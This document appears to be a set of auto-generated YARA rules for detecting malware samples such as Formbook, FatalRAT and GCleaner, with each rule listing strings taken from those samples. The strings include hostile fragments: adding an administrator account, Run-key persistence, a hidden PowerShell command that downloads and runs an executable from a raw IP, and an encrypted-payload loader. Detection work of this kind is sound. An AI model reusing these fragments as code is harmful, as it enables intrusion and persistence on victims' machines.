      description = "_subset_batch - file e013f82ecabef457fa9560e9d5f486cf3d51f71019210a34e8aecb989bb8d97a_e013f82e.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e013f82ecabef457fa9560e9d5f486cf3d51f71019210a34e8aecb989bb8d97a"
   strings:
      $x1 = "\"    WshShell.Run \"\"cmd.exe /c net user admin Password123 /add\"\", 0, True\" & vbCrLf & _" fullword ascii /* score: '33.00'*/
      $s2 = "\"    WshShell.Run \"\"cmd.exe /c net localgroup administrators admin /add\"\", 0, True\" & vbCrLf & _" fullword ascii /* score: '30.00'*/
      $s3 = "\"    Set colProcess = objWMIService.ExecQuery(\"\"SELECT * FROM Win32_Process WHERE Name = 'explorer.exe'\"\")\" & vbCrLf & _" fullword ascii /* score: '26.00'*/
      $s4 = "' Execute malicious code directly" fullword ascii /* score: '18.00'*/
      $s5 = "ExecuteGlobal _" fullword ascii /* score: '18.00'*/
      $s6 = "WshShell.RegWrite regKey & \"\\\" & regValue, scriptPath, \"REG_SZ\"" fullword ascii /* score: '18.00'*/
      $s7 = "FSO.DeleteFile(WScript.ScriptFullName)" fullword ascii /* score: '17.00'*/
      $s8 = "\"    Set objWMIService = GetObject(\"\"winmgmts:\\\\.\\root\\cimv2\"\")\" & vbCrLf & _" fullword ascii /* score: '17.00'*/
      $s9 = "scriptPath = WScript.ScriptFullName" fullword ascii /* score: '14.00'*/
      $s10 = "WScript.Sleep 5000" fullword ascii /* score: '13.00'*/
      $s11 = "regKey = \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" fullword ascii /* score: '13.00'*/
      $s12 = "GetSystem()" fullword ascii /* score: '12.00'*/
      $s13 = "' Hide the script window" fullword ascii /* score: '10.00'*/
      $s14 = "\"    Dim objWMIService, colProcess, objProcess, objConfig\" & vbCrLf & _" fullword ascii /* score: '9.00'*/
      $s15 = "\"Function GetSystem()\" & vbCrLf & _" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule e10d9c211fffa7e4391a7f517fcb4ad9_imphash_ {
   meta:
      description = "_subset_batch - file e10d9c211fffa7e4391a7f517fcb4ad9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b7ba3e477fae20320c80cf9f6f57dee44a0ede4df1ec50bf047d5dd86be18dc9"
   strings:
      $s1 = "Login:%s@%s" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule e10d9c211fffa7e4391a7f517fcb4ad9_imphash__82d42189 {
   meta:
      description = "_subset_batch - file e10d9c211fffa7e4391a7f517fcb4ad9(imphash)_82d42189.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "82d42189b5493e26a4075027921ef0682b709b43cf05cb36516a865ca99e31f5"
   strings:
      $s1 = "Login:%s@%s" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule FatalRAT_signature__68a3c4e8118045d33b6bdb7066b98efe_imphash_ {
   meta:
      description = "_subset_batch - file FatalRAT(signature)_68a3c4e8118045d33b6bdb7066b98efe(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00253f82c78aa90a213a1c3d7b828a66ba50b10b69cbd407e54061dc5830b684"
   strings:
      $s1 = "Instdll.dat" fullword ascii /* score: '19.00'*/
      $s2 = "nnnnnnnnnnn{" fullword ascii /* reversed goodware string '{nnnnnnnnnnn' */ /* score: '14.00'*/
      $s3 = "?8?.?#?" fullword ascii /* reversed goodware string '?#?.?8?' */ /* score: '11.00'*/
      $s4 = "?:?-? ?" fullword ascii /* reversed goodware string '? ?-?:?' */ /* score: '11.00'*/
      $s5 = "nnnnnnnnn+%s:" fullword ascii /* score: '9.50'*/
      $s6 = "?5?3?*?\"?\\?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'S' */
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      all of them
}

rule fa96fa118136580b5fae198a909f03f5_imphash_ {
   meta:
      description = "_subset_batch - file fa96fa118136580b5fae198a909f03f5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "88bd22f1cfd1836282b8e2a11a49fab537560b403f3dbcc91076efb3a2029106"
   strings:
      $x1 = " -w hidden -ep bypass -Command " fullword ascii /* score: '31.00'*/
      $s2 = "Start-Process $env:TEMP\\update.exe\"" fullword ascii /* score: '29.00'*/
      $s3 = "DownloadAndExecute" fullword ascii /* score: '22.00'*/
      $s4 = "http://150.40.119.46:8081/smart.exe " fullword ascii /* score: '19.00'*/
      $s5 = "-OutFile $env:TEMP\\update.exe; " fullword ascii /* score: '18.00'*/
      $s6 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s7 = "__imp__execute_onexit_table" fullword ascii /* score: '14.00'*/
      $s8 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s9 = "C:\\M\\B\\src\\build-MINGW64" fullword ascii /* score: '13.00'*/
      $s10 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s11 = "GNU C99 14.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99" fullword ascii /* score: '12.00'*/
      $s12 = "'GNU C99 14.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99" fullword ascii /* score: '12.00'*/
      $s13 = "2GNU C99 14.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99" fullword ascii /* score: '12.00'*/
      $s14 = "$__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s15 = ">__report_error" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule GCleaner_signature__651e57d4ccb1a3162fc07a2bd253eedd_imphash_ {
   meta:
      description = "_subset_batch - file GCleaner(signature)_651e57d4ccb1a3162fc07a2bd253eedd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aa586630eb5a50f271a1bdc1e20be4673b40a0c9b20433b7b2fcc0a65413526d"
   strings:
      $s1 = "Alt+ Clipboard does not support Icons/Menu '%s' is already being used by another form" fullword wide /* score: '17.00'*/
      $s2 = "TCommonDialog8" fullword ascii /* score: '13.00'*/
      $s3 = "Soot:\"" fullword ascii /* score: '10.00'*/
      $s4 = "Network is unreachable. Net dropped connection or reset." fullword wide /* score: '9.00'*/
      $s5 = ">275<655<" fullword ascii /* score: '9.00'*/ /* hex encoded string ''VU' */
      $s6 = "TIdHeaderListd" fullword ascii /* score: '9.00'*/
      $s7 = "6c~267~>6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'l&v' */
      $s8 = "7=}17[}:7" fullword ascii /* score: '9.00'*/ /* hex encoded string 'qw' */
      $s9 = ":$;3;B;^;" fullword ascii /* score: '9.00'*/ /* hex encoded string ';' */
      $s10 = "5:?36)? 6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Sf' */
      $s11 = "InHeaderList" fullword ascii /* score: '9.00'*/
      $s12 = "?7%9?]%\\>" fullword ascii /* score: '9.00'*/ /* hex encoded string 'y' */
      $s13 = "ContentType`" fullword ascii /* score: '9.00'*/
      $s14 = "=!=%=3=7=;=\\=|=" fullword ascii /* score: '9.00'*/ /* hex encoded string '7' */
      $s15 = "gjwoota" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      8 of them
}

rule ffda7de149f0fcfeb0bcff3f9aa897ec4f3dd2ea3efd0e62b808968f5955dac8_ffda7de1 {
   meta:
      description = "_subset_batch - file ffda7de149f0fcfeb0bcff3f9aa897ec4f3dd2ea3efd0e62b808968f5955dac8_ffda7de1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ffda7de149f0fcfeb0bcff3f9aa897ec4f3dd2ea3efd0e62b808968f5955dac8"
   strings:
      $s1 = "XZXZXZXZZ" fullword ascii /* base64 encoded string 'evWevY' */ /* score: '16.50'*/
      $s2 = "XXYXYY" fullword ascii /* reversed goodware string 'YYXYXX' */ /* score: '13.50'*/
      $s3 = "ZYYZYY" fullword ascii /* reversed goodware string 'YYZYYZ' */ /* score: '13.50'*/
      $s4 = "FKolRj.Kol." fullword ascii /* score: '10.00'*/
      $s5 = "AYZYYYYZX" fullword ascii /* score: '9.50'*/
      $s6 = "YYYYXXZZXXZ" fullword ascii /* score: '9.50'*/
      $s7 = "ZXYYYYYX" fullword ascii /* score: '9.50'*/
      $s8 = "ZZZYXXYYYYX" fullword ascii /* score: '9.50'*/
      $s9 = "* @ ANu" fullword ascii /* score: '9.00'*/
      $s10 = "* B@2S" fullword ascii /* score: '9.00'*/
      $s11 = "xfUk*(+ " fullword ascii /* score: '8.00'*/
      $s12 = "emtuumt" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule e8bd7db59a6bdd1f0b4ebe44c9d9f3ae3b8e3393efda5aa51b4f113becca422a_e8bd7db5 {
   meta:
      description = "_subset_batch - file e8bd7db59a6bdd1f0b4ebe44c9d9f3ae3b8e3393efda5aa51b4f113becca422a_e8bd7db5.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e8bd7db59a6bdd1f0b4ebe44c9d9f3ae3b8e3393efda5aa51b4f113becca422a"
   strings:
      $s1 = "ODDDDDD" fullword ascii /* reversed goodware string 'DDDDDDO' */ /* score: '16.50'*/
      $s2 = "ADDDDDDD" ascii /* reversed goodware string 'DDDDDDDA' */ /* score: '16.50'*/
      $s3 = "=4;4;4;4;4;4;4;4" fullword ascii /* score: '9.00'*/ /* hex encoded string 'DDDD' */
      $s4 = "* 3._!]" fullword ascii /* score: '9.00'*/
      $s5 = "mvgvvvw" fullword ascii /* score: '8.00'*/
      $s6 = "1mjOo!." fullword ascii /* score: '8.00'*/
      $s7 = "CYYzQ -" fullword ascii /* score: '8.00'*/
      $s8 = "%LgaR%I/" fullword ascii /* score: '8.00'*/
      $s9 = "Gtyn!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 16000KB and
      all of them
}

rule f340b73cc89e25e6726a019b3e79c0b491b69b0c54ae3f02ba062879c48253df_f340b73c {
   meta:
      description = "_subset_batch - file f340b73cc89e25e6726a019b3e79c0b491b69b0c54ae3f02ba062879c48253df_f340b73c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f340b73cc89e25e6726a019b3e79c0b491b69b0c54ae3f02ba062879c48253df"
   strings:
      $s1 = "testpowershell.exe" fullword wide /* score: '27.00'*/
      $s2 = "DelegateReadProcessMemoryA" fullword ascii /* score: '15.00'*/
      $s3 = "DelegateCreateProcessA" fullword ascii /* score: '15.00'*/
      $s4 = "processAttributes" fullword ascii /* score: '15.00'*/
      $s5 = "WriteProcessMemoryy" fullword ascii /* score: '15.00'*/
      $s6 = "DelegateWriteProcessMemory" fullword ascii /* score: '15.00'*/
      $s7 = "WriteProcessMemor" fullword ascii /* score: '15.00'*/
      $s8 = "ZipAndEncrypt" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.00'*/
      $s9 = "testpowershell" fullword ascii /* score: '13.00'*/
      $s10 = "testpowershell.Properties" fullword ascii /* score: '12.00'*/
      $s11 = "GetThreadContex" fullword ascii /* score: '12.00'*/
      $s12 = "DelegateWow64GetThreadContext" fullword ascii /* score: '12.00'*/
      $s13 = "DelegateGetThreadContext" fullword ascii /* score: '12.00'*/
      $s14 = "testpowershell.Properties.Resources.resources" fullword ascii /* score: '12.00'*/
      $s15 = "testpowershell.Form1.resources" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__27b1281d {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_27b1281d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "27b1281daa3529ce465df70b5436c5ea3413cd054f4b9ecabbfdf278f1a109b4"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s3 = "HTWvBBIJfevvYSZmCgL.PMtxHuImtj1V2FgQtAy+U056uuaCVD1Hvu70KJ2+WSA0uVa8LYphHCq2XM1`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s4 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s5 = "ProcessLoaderDetour" fullword ascii /* score: '24.00'*/
      $s6 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s7 = "ProcessManageWritesToExecutableMemory" fullword ascii /* score: '24.00'*/
      $s8 = "ProcessCommandLineInformation" fullword ascii /* score: '23.00'*/
      $s9 = "ProcessSubsystemProcess" fullword ascii /* score: '22.00'*/
      $s10 = "ProcessCaptureTrustletLiveDump" fullword ascii /* score: '21.00'*/
      $s11 = "Ehttp://www.ssl.com/repository/SSLcomRootCertificationAuthorityRSA.crt0 " fullword ascii /* score: '19.00'*/
      $s12 = "WbElevation.Helpers" fullword ascii /* score: '19.00'*/
      $s13 = "ProcessMemoryExhaustion" fullword ascii /* score: '18.00'*/
      $s14 = "ProcessCommitReleaseInformation" fullword ascii /* score: '18.00'*/
      $s15 = "ProcessCombineSecurityDomainsInformation" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule ed962854d0ae9d767997dd2e5410c100_imphash_ {
   meta:
      description = "_subset_batch - file ed962854d0ae9d767997dd2e5410c100(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "73163d93885f1b4326856320f87dbd9da2a202c82f9209b2192d23389fb83515"
   strings:
      $s1 = "4MSVCP140.dll" fullword ascii /* score: '23.00'*/
      $s2 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s3 = "Yapi-ms-win-crt-math-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s4 = "api-ms-win-crt-conio-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s5 = "uGjEapi-ms-win-crt-heap-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s6 = "^ntdll.dll" fullword ascii /* score: '20.00'*/
      $s7 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s8 = "* U14$@" fullword ascii /* score: '9.00'*/
      $s9 = "* KIiQ" fullword ascii /* score: '9.00'*/
      $s10 = "* gxm1WNm" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 23000KB and
      all of them
}

rule e18705a442ebb0d82cf9218e8217c71b14d1c52ecb41cc50fc0d4a2f4d2d023c_e18705a4 {
   meta:
      description = "_subset_batch - file e18705a442ebb0d82cf9218e8217c71b14d1c52ecb41cc50fc0d4a2f4d2d023c_e18705a4.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e18705a442ebb0d82cf9218e8217c71b14d1c52ecb41cc50fc0d4a2f4d2d023c"
   strings:
      $x1 = "private const hauzvncojj = \"  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Sub" ascii /* score: '39.00'*/
      $x2 = "private const mdibeize = \"  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subje" ascii /* score: '39.00'*/
      $x3 = "ect=*.example.com+URI=wmicimv2/* porcelanite{UserName=\"\"USERNAME\"\";Password=\"\"PASSWORD\"\"} -remote:localhost\"" fullword ascii /* score: '37.00'*/
      $x4 = "t=*.example.com+URI=wmicimv2/* porcelanite{UserName=\"\"USERNAME\"\";Password=\"\"PASSWORD\"\"} -remote:localhost\"" fullword ascii /* score: '37.00'*/
      $x5 = "private const fjgeet = \"  winrm invoke Create wmicimv2/Win32_Process porcelanite{CommandLine=\"\"notepad.exe\"\";CurrentDirecto" ascii /* score: '36.00'*/
      $x6 = "'private const iuepci = \"  -filter:\"\"select * from Win32_process where handle=0\"\"\"" fullword ascii /* score: '32.00'*/
      $s7 = "private const fjgeet = \"  winrm invoke Create wmicimv2/Win32_Process porcelanite{CommandLine=\"\"notepad.exe\"\";CurrentDirecto" ascii /* score: '30.00'*/
      $s8 = "private const rqspqkpn = \"  winrm enum shell/vakil -remote:srv.corp.com\"" fullword ascii /* score: '29.00'*/
      $s9 = "private const jbgtqaqjtss = \"  winrm create shell/vakil -file:shell.xml -remote:srv.corp.com\"" fullword ascii /* score: '29.00'*/
      $s10 = "private const gfilynv = \"  winrm get http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service?Name=WinRM\"" fullword ascii /* score: '28.00'*/
      $s11 = "private const fnxomvnpxyao = \"  winrm e wmicimv2/* -filter:\"\"select * from Win32_Service where State!='Running' and StartMode" ascii /* score: '27.00'*/
      $s12 = "private const elnwehr = \"  winrm get winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*" ascii /* score: '27.00'*/
      $s13 = "'private const aarnamvgj = \"  winrm enum wmicimv2/* -filter:\"\"select * from win32_service where StartMode=\\\"\"Auto\\\"\" an" ascii /* score: '27.00'*/
      $s14 = "private const dswczhgzopas = \"  winrm get uri -r:srv.corp.com\"" fullword ascii /* score: '27.00'*/
      $s15 = "'private const aarnamvgj = \"  winrm enum wmicimv2/* -filter:\"\"select * from win32_service where StartMode=\\\"\"Auto\\\"\" an" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x0d27 and filesize < 500KB and
      1 of ($x*) and all of them
}

rule Formbook_signature__424ae294 {
   meta:
      description = "_subset_batch - file Formbook(signature)_424ae294.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "424ae2948a4da9628f788e681957586c2d1e6ca1d4b615b8dd92a8930b5468d4"
   strings:
      $s1 = "WScript.Echo \"Script finished. Log written to: \" & filePath" fullword ascii /* score: '18.00'*/
      $s2 = "file.WriteLine \"Dictionary contents:\"" fullword ascii /* score: '18.00'*/
      $s3 = "folderPath = \"C:\\Temp\"" fullword ascii /* score: '17.00'*/
      $s4 = "filePath = folderPath & \"\\log.txt\"" fullword ascii /* score: '16.00'*/
      $s5 = "file.WriteLine \"Script completed at: \" & Now" fullword ascii /* score: '16.00'*/
      $s6 = "file.WriteLine \"Script run at: \" & currentTime" fullword ascii /* score: '13.00'*/
      $s7 = "dfgdfgdfgdd.Run cTFIHslactAX,0" fullword ascii /* score: '13.00'*/
      $s8 = "userInput = InputBox(\"Enter a number from 1 to 10\", \"VBScript Input\")" fullword ascii /* score: '13.00'*/
      $s9 = "str = wshNetwork.ComputerName" fullword ascii /* score: '11.00'*/
      $s10 = "'Spdhdfdfsus associatively ideopfraxist eyebolt nonapostolical;" fullword ascii /* score: '10.00'*/
      $s11 = "  WScript.Quit " fullword ascii /* score: '10.00'*/
      $s12 = "Set dict = CreateObject(\"Scripting.Dictionary\")" fullword ascii /* score: '10.00'*/
      $s13 = "dict.Add \"Apple\", 1" fullword ascii /* score: '10.00'*/
      $s14 = "Set wshNetwork = WScript.CreateObject(\"WScript\" & \".Network\")" fullword ascii /* score: '10.00'*/
      $s15 = "dict.Add \"Banana\", 2" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x2020 and filesize < 50KB and
      8 of them
}

rule f46733f8e9282a7cb2850b1abbfad154b06960cd07db4fda1e17dd40663a6d3d_f46733f8 {
   meta:
      description = "_subset_batch - file f46733f8e9282a7cb2850b1abbfad154b06960cd07db4fda1e17dd40663a6d3d_f46733f8.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f46733f8e9282a7cb2850b1abbfad154b06960cd07db4fda1e17dd40663a6d3d"
   strings:
      $s1 = "Execute decryptedContent" fullword ascii /* score: '23.00'*/
      $s2 = "decryptedContent = CustomRC4(encryptedBytes, \"!@@j|FFYYNUlB_A_\")" fullword ascii /* score: '16.00'*/
      $s3 = "Dim xmlObject, encryptedBytes, decryptedContent" fullword ascii /* score: '16.00'*/
      $s4 = "xmlObject.dataType = \"bin.base64\"" fullword ascii /* score: '14.00'*/
      $s5 = "' Obfuscation comment line - 20178bd2" fullword ascii /* score: '11.00'*/
      $s6 = "  xmlObj.dataType = \"bin.base64\"" fullword ascii /* score: '11.00'*/
      $s7 = "combinedBase64 = Replace(combinedBase64, \"JSUkQ1ZPRUNQTE8kJSU=\", \"\")" fullword ascii /* score: '10.00'*/
      $s8 = "xmlObject.text = combinedBase64" fullword ascii /* score: '10.00'*/
      $s9 = "base64Segments = Array(\"rKCgq\", \"VkRCR\", \"khHQk\", \"EqKSk\", \"=xfe0\", \"BWVUN\", \"TSkB9\", \"PeJAk\", \"KCgqQ\", \"U9WR" ascii /* score: '9.00'*/
      $s10 = "encryptedBytes = xmlObject.nodeTypedValue" fullword ascii /* score: '9.00'*/
      $s11 = "\"BVUFl\", \"FTEVG\", \"QH0=/\", \"vW1sj\", \"TlZNQ\", \"ktUUC\", \"NdXQ=\", \"=LS9/\", \"SPYAi\", \"LFSoJ\", \"SUkU0\", \"hBQ1E" ascii /* score: '9.00'*/
      $s12 = "MSFJ\", \"XKikp\", \"Ms00V\", \"dNZzW\", \"SpBIf\", \"fTOAW\", \"jroh0\", \"530Q8\", \"ef7uF\", \"y4cJS\", \"UkRkZ\", \"XSEdP\"," ascii /* score: '8.00'*/
      $s13 = "Loop While timeElapsed < (1 + Rnd() * 2)" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      8 of them
}

rule Formbook_signature_ {
   meta:
      description = "_subset_batch - file Formbook(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dcba50a5be328e080a5496812c9c9d0d2f3bda66372fb376b716997e6323c16d"
   strings:
      $s1 = "Set drabble = provisos.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "Set frathouse = provisos.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s3 = "Altissimo = junonia.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s4 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s5 = "Set provisos = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s6 = "Set junonia = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 100KB and
      all of them
}

rule e1e3e8b971aeb4ecf8d599a391bc83d0fc7e907ef6b88deaea4e99652b0cbcce_e1e3e8b9 {
   meta:
      description = "_subset_batch - file e1e3e8b971aeb4ecf8d599a391bc83d0fc7e907ef6b88deaea4e99652b0cbcce_e1e3e8b9.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e1e3e8b971aeb4ecf8d599a391bc83d0fc7e907ef6b88deaea4e99652b0cbcce"
   strings:
      $s1 = "x26\\x75\\x73\\x65\\x72\\x6e\\x61\\x6d\\x65\\x3d' + encodeURIComponent(_0x4fd17b) + _0x18244f(-0x2ce, -a0_0x54dab4._0x5850f2) + " ascii /* score: '15.00'*/
      $s2 = "ab4._0x236efd, -a0_0x54dab4._0x4965e8) + encodeURIComponent(_0x2e47bb) + '\\x26\\x61\\x76\\x3d' + encodeURIComponent(_0x24bbad) " ascii /* score: '15.00'*/
      $s3 = "\\x20\\x49\\x66\\x0a' + '\\x45\\x6e\\x64\\x20\\x53\\x75\\x62\\x0a', _0x2be3b6 = new ActiveXObject(_0x4b82b3(-0x2b7, -0x222) + _0" ascii /* score: '13.00'*/
      $s4 = "6', _0x401216 = GetObject(_0x4b5a5d(a0_0x571136._0x5a7dff, a0_0x571136._0x247968) + _0x4b5a5d(0x101, a0_0x571136._0x56b601) + _0" ascii /* score: '13.00'*/
      $s5 = "\\x64']) : _0x5055df = a0_0x3c28e6(_0x11fdce + _0x5bde82 + a0_0x9a6f55())[_0x47b3c2(a0_0x5dd8f8._0x5ccd8b, -a0_0x5dd8f8._0x1d9ec" ascii /* score: '13.00'*/
      $s6 = "f8._0xe21d3a, a0_0x5dd8f8._0x19b360) + '\\x74\\x65\\x6d\\x31\\x33\\x35\\x2e\\x30\\x2e\\x37' + _0x47b3c2(-0x19, -0x3a) + _0xdee69" ascii /* score: '12.00'*/
      $s7 = "4668, a0_0x16bed9._0x3fcbec) + '\\x73\\x74\\x2e\\x35\\x2e\\x31'), _0x3ab400 = _0x4a1f8c(-0xed, -0x1e);" fullword ascii /* score: '12.00'*/
      $s8 = "906 += String[_0x2edc53(-0xa6, -a0_0x1a0d4b._0x1c51f7) + '\\x64\\x65'](_0x280730 >> 0x6 & 0x3f | 0x80), _0x4a4906 += String['\\x" ascii /* score: '12.00'*/
      $s9 = "6bed9._0x4decbb, -a0_0x16bed9._0x26b5aa)] + '\\x0a';" fullword ascii /* score: '12.00'*/
      $s10 = "f(-0x196, -0xb8)) / 0x4 + -parseInt(_0x2fb10f(-0x101, 0x28)) / 0x5 + parseInt(_0x2fb10f(-0xa9, -a0_0x1d8297._0x57f992)) / 0x6 + " ascii /* score: '12.00'*/
      $s11 = " _0x192a69(-a0_0x44535b._0x34a9a1, -0x163) + '\\x6f\\x6e'](_0x4bac0c, _0xa68080, 0x6, null, null, 0x3);" fullword ascii /* score: '12.00'*/
      $s12 = "0x4a4906 += String[_0x2edc53(-0xa6, -0x1db) + '\\x64\\x65'](_0x280730 & 0x3f | 0x80);" fullword ascii /* score: '12.00'*/
      $s13 = "    return _0x4148ea << _0xc50c1f | _0x4148ea >>> 0x20 - _0xc50c1f;" fullword ascii /* score: '12.00'*/
      $s14 = "_0x15086b(-0x178, -a0_0x5b35f2._0x3f6372) + _0x15086b(-0x179, -0x1ce) + _0x1ffbfe));" fullword ascii /* score: '12.00'*/
      $s15 = "0x4a1f8c(0x12a, -a0_0x16bed9._0xbac56d)] + '\\x0a', _0x421e11 += _0x4a1f8c(0x2ba, a0_0x16bed9._0x138b18) + '\\x6d\\x65\\x3a\\x20" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 800KB and
      8 of them
}

rule e3ceea1afe12bee6c2be2d714f5e9ba9728d13f9e5aadb681d808c9a6b7ba8c3_e3ceea1a {
   meta:
      description = "_subset_batch - file e3ceea1afe12bee6c2be2d714f5e9ba9728d13f9e5aadb681d808c9a6b7ba8c3_e3ceea1a.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e3ceea1afe12bee6c2be2d714f5e9ba9728d13f9e5aadb681d808c9a6b7ba8c3"
   strings:
      $s1 = "69\\x6c' + _0x56d053(-0x9d, -a0_0x5641d9._0x225336)) + encodeURIComponent(_0x5a97bb) + _0x56d053(a0_0x5641d9._0x3446fa, -a0_0x56" ascii /* score: '15.00'*/
      $s2 = ", -0x184)) + encodeURIComponent(_0x295024);" fullword ascii /* score: '15.00'*/
      $s3 = ", -a0_0x5641d9._0x1104fb) + '\\x3d') + encodeURIComponent(_0x5eef8c) + ('\\x26\\x64\\x6f\\x6d\\x61' + _0x56d053(-a0_0x5641d9._0x" ascii /* score: '15.00'*/
      $s4 = "1d9._0x20439b) + encodeURIComponent(_0x13cd89) + _0x56d053(0x2e, -a0_0x5641d9._0x5d9606) + encodeURIComponent(_0xff625c) + (_0x5" ascii /* score: '15.00'*/
      $s5 = "8e6, _0xd3f091, _0x4d17c0[_0x58483d + 0x1], 0x4, -0x5b4115bc), _0x43a8c1, _0xfc58e6, _0x51d065[_0x58483d + 0x4], 0xb, 0x4bdecfa9" ascii /* score: '12.00'*/
      $s6 = "_0xfc58e6, _0xd3f091, _0x1820ed[_0x58483d + 0x0], 0x6, -0xbd6ddbc), _0x43a8c1, _0xfc58e6, _0xefc6c[_0x58483d + 0x7], 0xa, 0x432a" ascii /* score: '12.00'*/
      $s7 = "0x57bd3e, _0x43a8c1, _0xa5fafd[_0x58483d + 0xe], 0x11, -0x5986bc72), _0xd3f091, _0x57bd3e, _0x38af06[_0x58483d + 0xf], 0x16, 0x4" ascii /* score: '12.00'*/
      $s8 = "554, _0x328d00[_0x1b67c7 + 0x6], 0xf, -0x5cfebcec), _0x49cc89, _0x6b4a40, _0x328d00[_0x1b67c7 + 0xd], 0x15, 0x4e0811a1), _0x2222" ascii /* score: '12.00'*/
      $s9 = "67c7 + 0x0], 0x6, -0xbd6ddbc), _0x4e0554, _0x2222b8, _0x328d00[_0x1b67c7 + 0x7], 0xa, 0x432aff97), _0x6b4a40, _0x4e0554, _0x328d" ascii /* score: '12.00'*/
